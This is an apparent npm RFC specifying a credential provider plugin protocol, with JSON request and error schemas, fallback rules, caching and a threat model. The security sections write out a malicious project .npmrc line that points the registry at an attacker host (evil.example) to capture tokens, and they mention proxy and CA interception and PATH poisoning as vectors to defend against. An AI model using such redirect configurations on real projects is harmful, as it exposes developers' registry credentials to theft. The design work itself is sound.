# Credential Provider Plugin Protocol for Secure NPM Authentication

## Table of Contents

- [Summary](#summary)
- [Motivation](#motivation)
  - [Goals](#goals)
  - [Non-Goals](#non-goals)
- [Detailed Explanation](#detailed-explanation)
  - [How it works (high level)](#how-it-works-high-level)
  - [Key components](#key-components)
  - [Trusted publishing and `npm trust`](#trusted-publishing-and-npm-trust)
- [Rationale and Alternatives](#rationale-and-alternatives)
- [Implementation](#implementation)
  - [Plugin Discovery](#plugin-discovery)
  - [Protocol](#protocol)
    - [Request kinds](#request-kinds)
    - [`get` request](#get-request)
    - [`get` success response](#get-success-response)
    - [`login` request](#login-request)
    - [`logout` request](#logout-request)
    - [Error response](#error-response)
    - [Timeout and retry](#timeout-and-retry)
  - [Caching](#caching)
  - [Example flows](#example-flows)
- [Security Considerations](#security-considerations)
- [Prior Art](#prior-art)
- [Unresolved Questions and Bikeshedding](#unresolved-questions-and-bikeshedding)
- [Acknowledgments](#acknowledgments)

## Summary

This RFC proposes the implementation of a credential provider plugin protocol for the NPM CLI to enable secure, dynamic retrieval of authentication tokens.
The protocol allows external credential providers to supply short-lived tokens at runtime, eliminating the need to store secrets in plaintext within `.npmrc` files or environment variables.

## Motivation

Currently, NPM requires authentication tokens to be stored in plaintext within `.npmrc` files or injected via environment variables.
This practice violates enterprise security policies and is a known vector for exploitation.

NPM also lacks a native hook to automatically acquire or refresh short-lived credentials.
This discourages short token lifetimes (for example, <= 60 minutes) because developers are forced into manual copy/paste rotation.

A standardized credential provider protocol fixes this at the tooling layer and enables modern enterprise authentication workflows (brokered auth, device-bound tokens, Multi-Factor Authentication (MFA), Conditional Access (CA), and similar controls) without compromising developer experience.

### Goals

- Enable runtime token acquisition via a standardized provider interface.
- Support short-lived tokens without manual rotation.
- Support scoped registries and multiple registry configurations.
- Support third-party registry authentication using npm CLI and third-party credential providers.
- Preserve npm trusted publishing as the preferred authentication path for supported publish operations.
- Preserve graceful fallback behavior if no provider is available.

### Non-Goals

- Mandate a single identity provider or authentication mechanism (protocol is Identity Provider (IdP)-agnostic).
- Define a universal keychain-based storage requirement for Node tooling (providers may use OS keychains or brokers internally).
- Persist returned tokens to disk (explicitly avoided).
- Reintroduce a pre/post-install script vector or enable execution of untrusted arbitrary binaries.
  This protocol is a narrowly scoped, user-controlled auth hook — not a general-purpose plugin system.
- Trusted publisher behavior change or feature replacement.

## Detailed Explanation

The proposed plugin protocol defines a standard interface for external credential providers that can be invoked by the NPM CLI during authentication workflows.
When NPM needs credentials for a registry request (for example, installing from or publishing to a private registry), the CLI invokes a configured credential provider at runtime and receives a token in response.
This design avoids persisting tokens in `.npmrc` or relying on environment variables as a long-term secret store.
When a credential provider is configured for a registry, that provider becomes the authoritative auth source for that registry.
If provider resolution or execution fails, npm may fall back to legacy auth sources, but it must emit an explicit warning that auth downgraded from credential provider mode.

### How it works (high level)

1. **Registry request requires auth**: NPM determines that a request to a registry requires authentication (install, publish, and similar operations).
2. **Plugin discovery**: NPM finds and resolves the ordered list of credential providers configured for the target registry.
   This happens once per registry per command, regardless of how many workspace members need that registry.
3. **Invoke provider**: NPM spawns the first provider as a child process, writes a JSON request to `stdin`, then closes the write end (sends EOF).
   The provider writes a JSON response to `stdout`, then exits.
   If the provider returns an error with kind `"url-not-supported"`, npm tries the next provider in the list.
   npm serializes provider invocations to avoid overlapping prompts and ambiguous-account errors.
4. **Use token in-memory**: NPM uses the returned token for the outgoing HTTP request without writing it to disk.
5. **Provider-owned token lifecycle**: NPM keeps a process-lifetime in-memory cache of provider responses (see [Caching](#caching)).
   The cache ensures the provider is typically spawned only once per registry per npm command.
   Token caching and refresh policy beyond the current process are owned by the provider.
6. **Failure handling**: If no provider is configured, NPM continues with existing credential behavior.
   If a provider is configured but fails during a `get` or `logout` request, NPM warns and falls back to legacy credential behavior.
   If a provider fails during a `login` request, NPM hard-fails — falling back would persist a plaintext token to `.npmrc`.

### Key components

#### Host (npm CLI)

- Decide when credential providers are invoked.
- Resolve the ordered provider list for the target registry.
- Try providers in configured order; advance on `"url-not-supported"` errors.
- Resolve and pass request context to the provider via `stdin` JSON.
- Declare the protocol version (`v`) in every request — no negotiation handshake.
- Serialize provider invocations (one at a time) — even in non-interactive mode — for deterministic fallback and clear account-ambiguity diagnostics.
- Use returned credentials in-memory only.
- Enforce retry limits and timeout; kill the provider on expiry.
- Never log credentials, tokens, or authorization headers.
- When provider execution fails on `get` or `logout`, fall back to legacy auth with an explicit warning.
  When provider execution fails on `login`, hard-fail — no fallback.

#### Plugin (credential provider)

- Acquire credentials for the target registry.
- Own token caching and refresh policy.
- Validate the declared protocol version (`v`) on every request — fail immediately if unsupported.
- Ignore unknown request fields (forward compatibility).
- Return credentials in a structured response shape.
- Return structured errors when credential acquisition fails.

### Trusted publishing and `npm trust`

Credential providers and trusted publishers solve different authentication problems and are separate extension points.
A trusted publisher authenticates a CI/CD workload for a specific package and publish operation by exchanging an OIDC identity token with the registry.
A credential provider supplies conventional registry credentials for requests that require them, including package reads, token-based publishes, and registry-management commands.

For `npm publish` and `npm stage publish`, npm must preserve its existing authentication precedence: when the target registry supports trusted publishing and a supported OIDC environment is available, npm attempts its built-in OIDC exchange before consulting configured credential providers or legacy credentials.
Credential provider configuration must not disable, replace, or intercept this built-in trusted-publishing path.
If npm's trusted-publishing implementation proceeds to its existing traditional-auth fallback, the configured credential provider is consulted before legacy credentials.
OIDC identity tokens, claims, and exchange responses must never be sent to a credential provider.

The `npm trust` command manages the registry-side relationship between a package and a trusted publisher; it does not perform a trusted publish.
Its registry API calls therefore use the normal credential resolution path.
When a credential provider is configured for the target registry, `npm trust list` invokes it with a `get` request and `permission: "read-only"`, while commands that create, update, or revoke trust invoke it with `permission: "read-write"`.
No new `trust` protocol request kind is needed: the provider authenticates the registry request, and npm remains responsible for trust configuration, confirmation prompts, and any registry-required OTP or browser-based proof of presence.

For example, an npm-maintained credential provider for `registry.npmjs.org` would be installed as an executable and selected with the same per-registry `credentialProvider` configuration as any other provider.
Once configured, `npm trust` would automatically use credentials returned by that provider for its management API calls.
Adding a new trusted-publisher type to commands such as `npm trust github` is separate from credential acquisition and requires support in the npm CLI and registry, or a future trusted-publisher discovery protocol; installing a credential provider alone must not register new `npm trust` subcommands or teach the registry to validate a new OIDC issuer.

## Rationale and Alternatives

1. **Plaintext `.npmrc` tokens** — Rejected.
   Tokens vulnerable to theft via malware or accidental exposure; violates enterprise security policies.
2. **Encrypt `.npmrc` tokens locally** — Rejected.
   Adds key management and cross-platform complexity; does not solve rotation or dynamic retrieval.
3. **Environment variables exclusively** — Rejected.
   Still violates secure storage policies; does not scale for short-lived tokens across dev machines and CI/CD.
4. **Shell command registration** — Rejected.
  Providers configured as shell command strings with arguments (e.g. `//<registryHost>:credentialProvider=<command> <arguments>`).
   Drawbacks:
   - Shell injection risk if command string passes through shell parsing.
  - Platform-dependent quoting and escaping.
  - Ambiguous separation between the executable and its arguments.
  This does not preclude direct executable registration: this RFC accepts a path or executable name, passes no configured arguments, and never invokes a shell.
5. **Long-lived bidirectional process** — Considered.
   Provider stays alive for the duration of the npm command; npm sends multiple requests on the same stdin/stdout stream.
   Amortizes startup cost and enables richer protocol features (refresh, batch).
   Not recommended for v1:
   - In-memory cache already limits spawns to 1-2 per registry per command.
   - Adds process lifecycle management (crash detection, reconnection, graceful shutdown) to both npm and every provider implementation.
   - Requires message framing (length-prefix or newline-delimited JSON) — one-shot uses EOF as the natural delimiter.
   - Each request is an isolated process — no corrupted state carries over from a previous failure.
   - Provider implementation reduces to: read stdin, write stdout, exit.
   - Git credential helpers use one-shot successfully at massive scale.
   - NuGet's credential provider is a long-lived bidirectional process; one-shot is simpler for v1 and version negotiation can be revisited if needed.

The plugin protocol is the most secure and flexible option, aligning with prior art (pnpm tokenHelpers, NuGet credential providers, pip keyring, Git credential helpers, Cargo credential providers).

## Implementation

### Plugin Discovery

#### Configuration

The user or global `.npmrc` stores executable references, not npm package identifiers or shell commands.
The value is an ordered, comma-separated list of absolute executable paths or bare executable names:

- `//<registryHost>:credentialProvider=<executable>[,<executable>...]` (per-registry)

Only per-registry configuration is supported.
Global default (`credentialProvider=<executable>`) and per-scope (`@scope:credentialProvider=<executable>`) forms are intentionally omitted.
Rationale: the effective registry URL comes from project `.npmrc` (which may be checked into a repo).
A global or scope-level provider is not bound to any specific host, so a malicious project `.npmrc` setting `registry=https://evil.example/` would cause the provider to mint a token and npm to send it to an attacker-controlled host.
Per-registry configuration binds the provider to a specific trusted host, eliminating this exfiltration vector by construction.

Only user or global `.npmrc` grants execution trust.
All `credentialProvider*` keys (`credentialProvider`, `credentialProviderTimeoutMs`, `credentialProviderAccountHint`) in project `.npmrc` are ignored entirely.

npm tries providers in the order listed.
When a provider returns an `Err` with kind `"url-not-supported"`, npm advances to the next provider.
If all providers return `"url-not-supported"`:
- On `get` or `logout`: npm falls back to legacy auth and emits a warning.
- On `login`: npm hard-fails — no fallback.
  Falling back would persist a plaintext token to `.npmrc`.

npm does not cache which provider succeeded for a given registry; providers are tried in order on every npm command.
This matches Cargo's credential provider model.
Provider-side token caching ensures the successful provider returns near-instantly on subsequent invocations, so the cost of re-trying the list is negligible in practice.

Example:

```ini
# ~/.npmrc

# Per-host — bare name is resolved from PATH
//registry.example.com:credentialProvider=corp-npm-credprovider
//registry.example.com:credentialProviderAccountHint=user@corp.com

# Per registry — absolute paths and fallback providers are supported
//pkgs.dev.azure.com/org/_packaging/feed/npm/registry:credentialProvider=C:\Program Files\Contoso\npm-credprovider.exe,D:\Tools\backup-credprovider.exe
```

#### Provider Binary Resolution

Each provider reference in user/global `.npmrc` must be either an absolute path to an executable or a bare executable name containing no directory separators.
Relative paths are rejected because resolving them against the current working directory would allow a project to substitute a provider binary.
Shell command strings, configured arguments, environment-variable expansion, and home-directory expansion are not supported.

For an absolute path, npm validates that the target exists and is executable, then spawns that path directly.
For a bare executable name, npm resolves it using the npm process's `PATH` and the platform's normal executable-extension rules.
npm must ignore empty and relative `PATH` entries during this search so resolution can never fall back to the project working directory.
After resolving a bare name, npm spawns the resulting absolute path directly without a shell.
If resolution fails or produces a non-executable file, that provider invocation fails under the normal provider fallback rules.

Adding an executable reference to user/global `.npmrc` **is** the trust decision — the same model as Git and Docker credential helpers.
npm does not install, update, or verify the provenance of provider binaries.
Administrators are responsible for deploying providers and protecting the executable and its containing directory from modification by less-trusted users.
Absolute paths are recommended for CI and other high-assurance environments because they avoid dependence on mutable `PATH` ordering.

### Protocol

Providers are executed as a child process using a `stdin`/`stdout` JSON protocol:

- npm spawns the provider executable with no command-line arguments and no shell interpolation.
- npm writes exactly one UTF-8 JSON request to `stdin`, then closes the write end (sends EOF).
- The provider writes exactly one UTF-8 JSON response to `stdout`, then exits.
- `stderr` is reserved for diagnostic logging — npm streams it to the user per loglevel but never parses it.
- Exit code 0 + recognized `Ok` response = success.
  Non-zero exit or `Err` response = failure.
- npm enforces a uniform timeout (see [Timeout and retry](#timeout-and-retry)).
  On expiry, npm kills the process and treats it as failure.
  Configurable via `credentialProviderTimeoutMs` in user/global `.npmrc`.

This follows [Cargo's credential provider protocol](https://doc.rust-lang.org/cargo/reference/credential-provider-protocol.html) — structured communication via `stdin`/`stdout`, `stderr` for diagnostics — adapted to a one-shot spawn model similar to NuGet credential providers and Git credential helpers.

#### Request kinds

| Kind | Required | Purpose |
|------|----------|---------|
| `get` | yes | Acquire credentials for a registry request (may be interactive or silent) |
| `login` | no | Force fresh authentication and persist — hooks into `npm login` |
| `logout` | no | Remove stored credentials — hooks into `npm logout` |

Providers must implement `get`.
`login` and `logout` are optional — a provider that does not support them must return `operation-not-supported`.

When a provider returns `operation-not-supported` for `login`, npm must **hard-fail** — it must not fall back to prompting for a plaintext token.
Rationale: `login` is optional, so a get-only provider always returns `operation-not-supported`.
Falling back to the default login flow would persist a plaintext token to `.npmrc`, which is the security regression this RFC exists to prevent.
If a user needs legacy login behavior, they must remove the provider configuration for that registry first.

When a provider returns `operation-not-supported` for `logout`, npm falls back to its default logout behavior (removing `.npmrc` token entries) with a warning.

#### `get` request

```json
{
  "v": 1,
  "kind": "get",
  "registry": "https://pkgs.dev.azure.com/org/_packaging/feed/npm/registry/",
  "permission": "read-only",
  "accountHint": "user@example.com",
  "interactive": true,
  "retry": false,
  "logLevel": "info",
  "network": {
    "httpsProxy": "https://proxy.example.com:8080",
    "httpProxy": "http://proxy.example.com:8080",
    "noProxy": "localhost,127.0.0.1",
    "strictSsl": true,
    "caFile": "/path/to/ca-bundle.crt"
  }
}
```

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `v` | integer | yes | Protocol version. npm declares in every request — no handshake. Major version bump = breaking changes; new optional fields don't require a bump. Provider does not echo the version back. |
| `kind` | string | yes | Must be `"get"`. |
| `registry` | string | yes | Fully qualified absolute base URI. Resolved from the nerf-darted config key where the provider was found. |
| `permission` | string | yes | `"read-only"` (install, view, search) or `"read-write"` (publish, unpublish). Follows npm's existing token permission vocabulary (`npm token create --packages-and-scopes-permission`). Providers that don't support permission-scoped tokens may ignore this and return a token valid for both. |
| `accountHint` | string | no | Which account to use when multiple are available for the same registry. See below. |
| `interactive` | boolean | yes | `true` by default; `false` only when user passes `--no-interactive`. See below. |
| `retry` | boolean | yes | `true` on retry after registry auth failure (401/403). Provider should bypass its cache and re-acquire. |
| `logLevel` | string | yes | Current npm log verbosity (from `--loglevel` or npm config). Providers may use to control diagnostic output. |
| `network` | object | no | Proxy and TLS settings from npm config. See below. |

**accountHint resolution:** Sourced exclusively from the config key `credentialProviderAccountHint` in user/global `.npmrc` (e.g. `//<registryHost>:credentialProviderAccountHint=user@corp.com`).
This is a new optional, explicit config entry that users/admins add manually; npm does not create it automatically and does not accept `--accountHint` CLI flags.
If the config key is absent, the field is omitted.
npm never writes `accountHint` to `.npmrc` — the config key is user-managed only.
Providers may ignore the hint.

**interactive semantics and `--no-interactive`:**

- npm defaults `interactive` to `true` on all commands.
- `--no-interactive` flag explicitly sets it to `false`.
  Available on any command that may invoke a provider (`install`, `publish`, `view`, `login`, etc.).
- **Why default `true`:** Eliminates the manual login-then-retry workflow.
  When a token expires mid-`npm install`, the provider can re-authenticate (device code, MFA, broker prompt) without forcing the user to abort, run `npm login`, and restart.
  Cargo's model — where expired tokens require a manual `cargo login` — is the UX gap we are closing.
- **Why not infer from TTY/CI:** TTY detection is unreliable (piped terminals, Docker, SSH, IDE terminals produce false negatives).
  CI env var sniffing adds heuristic complexity with no clear standard.
  The user knows their context — `--no-interactive` is the explicit opt-out.
- **CI guidance:** CI pipelines should pass the new `--no-interactive` flag (or its env var equivalent `npm_config_interactive=false`, per npm's standard config-to-env mapping).
  This is consistent with npm's existing CI guidance — use `npm ci` instead of `npm install`, etc. — where CI environments are expected to opt in to stricter, non-interactive behavior explicitly.
- **When `true`:** Provider may block for user interaction (browsers, device codes, MFA).
  Must not read from `stdin` — it belongs to the protocol stream.
- **When `false`:** Provider must not block waiting for user interaction.
  If it cannot acquire credentials silently, it must return an error.

**network fields:** `httpsProxy`, `httpProxy`, `noProxy`, `strictSsl`, `caFile`.
Absent fields mean "not configured."
Forwarded because providers make their own outbound HTTP requests (e.g. to an identity provider) and cannot inherit these settings from the environment — npm's `cafile` and `strict-ssl` are npm-specific config, not Node.js TLS defaults, and proxy settings may differ from environment variables.

npm must source `network.*` fields exclusively from user/global `.npmrc`.
Project-level `strict-ssl`, `cafile`, `https-proxy`, `proxy`, and `noproxy` settings must never be forwarded to credential providers.
A checked-in project `.npmrc` could otherwise route the provider's IdP exchange through an attacker proxy or pin a malicious CA and intercept the token.

Providers must ignore unknown fields for forward compatibility.

npm expects providers to support the protocol version npm declares (`v`).
If a provider does not support the declared version, it must respond with an `Err` of kind `"version-not-supported"` with an appropriate message.
npm will fail with actionable guidance and must not retry with a lower version.

#### `get` success response

```json
{
  "Ok": {
    "kind": "get",
    "auth": {
      "type": "bearer",
      "token": "<token>"
    }
  }
}
```

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `Ok.kind` | string | yes | Must be `"get"`. |
| `Ok.auth` | object | yes | Credentials. See Auth Types below. |

The `auth` object uses an explicit `type` discriminator field:

**Bearer token** — npm sends `Authorization: Bearer <token>`:
```json
{
  "type": "bearer",
  "token": "xxxxxxxxxxxx"
}
```

**Basic auth** — npm encodes `username:password` to base64 and sends `Authorization: Basic <base64>`:
```json
{
  "type": "basic",
  "username": "someusername",
  "password": "xxxxxxxxxxxx"
}
```

Provider returns plain values; npm handles encoding.

#### `login` request

When a credential provider is configured for a registry, `npm login` delegates to the provider rather than performing its default behavior (persisting tokens in `.npmrc`).

```json
{
  "v": 1,
  "kind": "login",
  "registry": "https://registry.example.com/",
  "accountHint": "user@example.com",
  "interactive": true,
  "retry": true,
  "logLevel": "info",
  "network": {
    "httpsProxy": "https://proxy.example.com:8080",
    "strictSsl": true
  }
}
```

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `v` | integer | yes | Protocol version. |
| `kind` | string | yes | Must be `"login"`. |
| `registry` | string | yes | Target registry base URI. |
| `accountHint` | string | no | From `.npmrc` config (`credentialProviderAccountHint`). |
| `interactive` | boolean | yes | `true` by default; `false` with `--no-interactive`. |
| `retry` | boolean | yes | Always `true` for `login` — provider must bypass cache and force fresh authentication. |
| `logLevel` | string | yes | Current npm log verbosity. |
| `network` | object | no | Proxy and TLS settings (same shape as `get`). Needed for outbound requests to identity providers. |

`login` reuses the `get` request context with two intentional differences: `retry` is always `true` (to force fresh authentication), and `permission` is omitted (login establishes identity/session state; any persisted permission scope is provider-defined).
The provider executes the authentication flow (OAuth, device code, SSO, MFA, or equivalent) and persists resulting credentials in provider-managed secure storage (for example, OS keychain, encrypted file, or broker cache).
npm does not receive or persist credential material during `login`; this operation is provider-managed end to end.

`login` receives the same context fields as `get` (`network`, `logLevel`, `interactive`) because the provider makes the same outbound HTTP requests to identity providers.
`--no-interactive` on `npm login` passes `interactive: false` — the provider should fail if it cannot authenticate silently (e.g. no cached refresh token available).

Response on success:

```json
{
  "Ok": {
    "kind": "login"
  }
}
```

npm does not persist anything on login success — the provider owns credential storage entirely.
If the user wants `accountHint` passed on subsequent commands, they configure it manually in `.npmrc`.

This matches Cargo's `login` request kind where `npm login --registry <url>` delegates entirely to the provider, enabling modern auth flows (OAuth, SSO, device code) that `npm login` cannot handle natively.

#### `logout` request

When a credential provider is configured for a registry, `npm logout` delegates to the provider rather than removing `.npmrc` token entries.

```json
{
  "v": 1,
  "kind": "logout",
  "registry": "https://registry.example.com/",
  "logLevel": "info",
  "network": {
    "httpsProxy": "https://proxy.example.com:8080",
    "strictSsl": true
  }
}
```

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `v` | integer | yes | Protocol version. |
| `kind` | string | yes | Must be `"logout"`. |
| `registry` | string | yes | Target registry base URI. |
| `logLevel` | string | yes | Current npm log verbosity. |
| `network` | object | no | Proxy and TLS settings (same shape as `get`). Optional; omitted if no proxy/TLS config is set. May be used for best-effort server-side token revocation. |

The provider removes stored credentials for that registry from its secure storage.
Providers may optionally attempt server-side token revocation (e.g. `POST /oauth/revoke`) using the `network` context, but must not block logout on network failure — the user's intent is to remove local credentials, and that must always succeed.

Response on success:

```json
{
  "Ok": {
    "kind": "logout"
  }
}
```

#### Behavior changes for `login` and `logout`

- `npm login` must not persist tokens to `.npmrc` when a provider is configured and returns `Ok`.
  The provider owns credential storage.
- `npm logout` must not remove `.npmrc` token entries when a provider is configured and returns `Ok`.
  It delegates to the provider.
- If no provider is configured, `npm login` and `npm logout` behave as today with no warning.
- If a provider is configured but returns `operation-not-supported` for `login`, `npm login` must hard-fail — no fallback.
  A get-only provider always returns `operation-not-supported` for `login`; falling back would persist a plaintext token to `.npmrc`.
  If a user needs legacy login, they must remove the provider configuration first.
- If all configured providers return `url-not-supported` for `login`, `npm login` must hard-fail — same rationale as above.
- If a provider is configured but returns `operation-not-supported` for `logout`, npm falls back to default logout behavior (removing `.npmrc` token entries) and emits a warning.
- If a provider is configured and fails during `login` (error kind `"other"`, timeout, or non-zero exit), `npm login` must hard-fail — no fallback.
  Falling back would persist a plaintext token to `.npmrc`, which is the exact security regression this RFC exists to prevent.
- If a provider is configured and fails during `logout` (error kind `"other"`, timeout, or non-zero exit), `npm logout` falls back to removing the `.npmrc` token entry and must emit an explicit warning.
  Logout failure does not create a security hole — the fallback ensures local credentials are still cleared.
  Note: in the provider-managed model, credentials live in the provider's secure storage (e.g. OS keychain), not in `.npmrc`.
  On logout failure, the provider's stored credentials may remain active.
  npm should warn users that they may need to manually clear provider-managed credentials (e.g. by running the provider's own logout command or clearing the OS keychain entry).

#### Error response

On failure, the provider responds with an `Err` object:

```json
{
  "Err": {
    "kind": "version-not-supported",
    "message": "Protocol version 2 is not supported by this provider."
  }
}
```

| Error kind | Meaning | npm behavior |
|------------|---------|--------------|
| `"url-not-supported"` | Provider does not handle this registry. | Skip to next provider in the configured list. If all providers return this: `get`/`logout` fall back to legacy auth with warning; `login` hard-fails. |
| `"version-not-supported"` | Provider does not support the declared protocol version. | Hard-fail with actionable guidance (update provider). No retry with lower version. |
| `"operation-not-supported"` | Provider does not support this request kind. | `get`/`logout`: fall back to legacy auth with warning. `login`: hard-fail — no fallback. |
| `"other"` | Generic error. | `get`/`logout`: fall back to legacy auth with warning. `login`: hard-fail — no fallback. |

Fields:
- `kind` (string, required): Error category.
- `message` (string, required): Human-readable, suitable for display.
  Must not contain tokens, passwords, or PII.

#### Timeout and retry

**Per-request timeouts:**

All request kinds use a uniform timeout across request kinds.
The default is 120 seconds; this accommodates interactive flows (device code, MFA) that may occur even during `get` requests.
If a provider exceeds the timeout, npm kills the process and treats it as failure.
Users can override the default with `credentialProviderTimeoutMs` in user/global `.npmrc` (per-registry or global).

**Auth failure retry flow:**

When npm receives HTTP 401, 403, or a similar auth failure from a registry:

1. npm evicts all in-memory cached credentials for that registry (all permission variants).
2. npm spawns the provider with a new `get` request with `retry: true`.
   The provider should invalidate its cached credentials and re-acquire.
3. If the provider returns new credentials, npm retries the failed registry request.
4. If the registry rejects again, npm fails the command — no further retries.

Retrying on both 401 and 403 improves on NuGet's credential provider protocol, which only retries on 401.
A 403 can indicate the token is valid but lacks required claims (e.g. MFA, device compliance) that a re-authentication could satisfy.

**Retry limits:**
- Max 1 retry per auth failure per registry.

### Caching

- The credential provider owns long-lived token cache and refresh policy.
- npm must not implement long-lived caching — the CLI keeps a **process-lifetime in-memory cache** only.
- Cache key: resolved provider executable path + registry base URI + permission.
- npm must not persist tokens to disk.
- On auth failure (401/403), npm evicts **all** permission variants of the in-memory cache for that registry (both read-only and read-write entries) and re-spawns the provider with `retry: true`, signaling it to bypass its own cache.
  This avoids stale entries when a read-write rejection also invalidates the read-only token (worst case is one redundant spawn).

### Example flows

#### Desktop: login then use

Setup (once):
```sh
# Install corp-npm-credprovider using the vendor's installer or enterprise software deployment.
```

User `.npmrc` (`~/.npmrc`):
```ini
//registry.example.com:credentialProvider=corp-npm-credprovider
```

Project `.npmrc` (checked in with the repo):
```ini
registry=https://registry.example.com/
```

```sh
# optional
$ npm login --registry https://registry.example.com
# Provider spawned with login request — opens full auth flow (browser, device code, SSO)
# Provider stores credentials in OS keychain; npm persists nothing to .npmrc

$ npm publish
# npm resolves registry from project .npmrc; credential provider resolved from user .npmrc
# Provider spawned with get request (permission: read-write) — returns cached token
# instantly from keychain. If token is expired or unavailable, provider re-acquires
# silently (refresh token) or interactively (browser/device code) within the same get call.
```

#### CI: managed identity / workload identity

Pipeline setup (once, in image or bootstrap step):
```sh
# Install /opt/corp/bin/corp-npm-credprovider in the pipeline image.
```

Pipeline `.npmrc`:
```ini
//registry.example.com:credentialProvider=/opt/corp/bin/corp-npm-credprovider
```

Pipeline run:
```sh
# Optional: some providers may require an explicit login step (e.g. service principal
# registration). Providers using ambient identity (managed identity, workload
# identity federation) could skip this.
$ npm login --registry https://registry.example.com --no-interactive

$ npm ci --no-interactive
# Provider acquires token silently via ambient or pre-authenticated identity
# Token used in-memory — nothing written to disk
# If silent acquisition fails, npm hard-fails with a diagnostic
```

## Security Considerations

#### Trust boundary

Credential providers protect credentials at rest and support short-lived authentication.
They do not sandbox package code or defend against arbitrary code already executing with the user's identity.
Providers must avoid granting that code authority beyond what the user's current session already possesses.

#### Threat model

| Threat | Attack vector | Defense |
|--------|--------------|---------|
| Binary substitution at rest | Malware, compromised installer, shared workstation | User/global `.npmrc` trust decision + OS permissions on the executable and containing directory |
| PATH poisoning | Malicious shell profile, CI manipulation, relative or empty `PATH` entry | Prefer absolute paths; bare names search only absolute, non-empty `PATH` entries and are resolved to an absolute path before spawn |
| Executable-name collision | A different binary with the same name appears earlier in `PATH` | Prefer absolute paths; log the resolved executable path at verbose log levels |
| Malicious project `.npmrc` | Repo plants rogue provider config | All `credentialProvider*` keys ignored from project `.npmrc` |
| Timeout manipulation via project `.npmrc` | `credentialProviderTimeoutMs=1` forces timeout to trigger fallback | `credentialProviderTimeoutMs` ignored from project `.npmrc` |
| Account hint redirection | `credentialProviderAccountHint` redirects to attacker account | `credentialProviderAccountHint` ignored from project `.npmrc` |
| Provider replacement through project dependencies | User config points into project-controlled `node_modules` and an install changes the executable | Recommend deployment to an administrator-controlled directory; user/global configuration remains an explicit trust decision |
| Token exfiltration via registry redirect | Project `.npmrc` sets `registry=https://evil.example/`; global provider mints a token and npm sends it to the attacker | Per-registry config only — no global/scope providers. Provider is bound to a specific trusted host by construction. Providers should additionally return `url-not-supported` for unrecognized hosts. |
| Network interception via project `.npmrc` | Project `.npmrc` sets `https-proxy` or `cafile` to route provider IdP calls through attacker proxy | `network.*` fields sourced from user/global `.npmrc` only; project-level network settings never forwarded to providers |

#### Process memory

Node.js (and any user-space process) holds secrets in plaintext memory while running.
An attacker with sufficient access to read process memory (debugger attach, `/proc/<pid>/mem`, memory dump) can extract tokens regardless of how they were acquired.
This RFC does not attempt to defend against that vector — it is an OS-level concern shared by every credential-bearing process.
The goal is to eliminate **persistent** plaintext storage (`.npmrc` files, environment variables, shell history) that survives beyond the lifetime of a single command.

## Prior Art

- **pnpm tokenHelpers** — pnpm supports `tokenHelpers` in `.npmrc` that invoke external commands to retrieve tokens.
  Similar concept but uses raw command strings without integrity verification.
- **NuGet credential providers** — .NET ecosystem uses a plugin protocol for credential acquisition with structured JSON communication over stdio.
  Long-lived bidirectional process with version negotiation on startup.
- **pip keyring** — Python's pip delegates credential storage/retrieval to the system keyring via a plugin interface.
- **Git credential helpers** — Git invokes configured helpers via stdio to acquire credentials for remote operations.
  Actions (get, store, erase) passed as CLI arguments.
  One-shot spawn model.
- **Cargo credential providers** — Rust's Cargo uses a stdin/stdout JSON protocol for credential provider plugins.
  Long-lived process, version hello on startup, multiple request kinds (get, login, logout).
  This design adapts Cargo's message shapes and request kinds to a one-shot spawn model.

## Unresolved Questions and Bikeshedding

- **`authChallenges` and `httpStatus`:** this design does not forward `WWW-Authenticate` header values or the HTTP status code to the provider.
  On retry, providers receive only `retry: true` and must do their best re-acquisition (silent refresh, broker call, etc.).
  If the new token is still rejected, npm fails.
  This is sufficient for the common case (expired tokens).
  Richer challenge forwarding and status codes can be added.

## Acknowledgments

This RFC builds on the original credential provider RFC contribution by [@pwoosam](https://github.com/pwoosam) ([npm/rfcs#850](https://github.com/npm/rfcs/pull/850)), which established the core concept of a stdio-based credential provider plugin for npm, including provider discovery via `.npmrc`, the one-shot spawn model, structured JSON request/response protocol, and a security-focused auth posture.
That PR serves as the foundation for this work.

The protocol design in this RFC draws extensively from the [unofficial-npm-credential-provider-rfc](https://github.com/Filyus/unofficial-npm-credential-provider-rfc) draft, which proposed a bidirectional JSON protocol with version negotiation, structured error kinds (`url-not-supported`, `not-found`, `operation-not-supported`, `other`), explicit request kinds (get, login, logout, refresh, erase, get-batch), cache control fields (`cache`, `expiresAt`, `operationIndependent`, `granularity`), the `erase` request for credential rejection notification, retry context (`retry`, `httpStatus`, `authChallenges`), the `interactive` field for CI/non-interactive behavior, provider chaining via `url-not-supported`, per-request timeouts by kind, and a comprehensive security threat model.
The protocol shapes and error taxonomy in this RFC are directly adapted from that draft.

Additional design influence from [Cargo's credential provider protocol](https://doc.rust-lang.org/cargo/reference/credential-provider-protocol.html), which established the pattern of structured JSON messages on stdin/stdout, stderr for diagnostics, and request kinds (get, login, logout) for credential provider plugins.

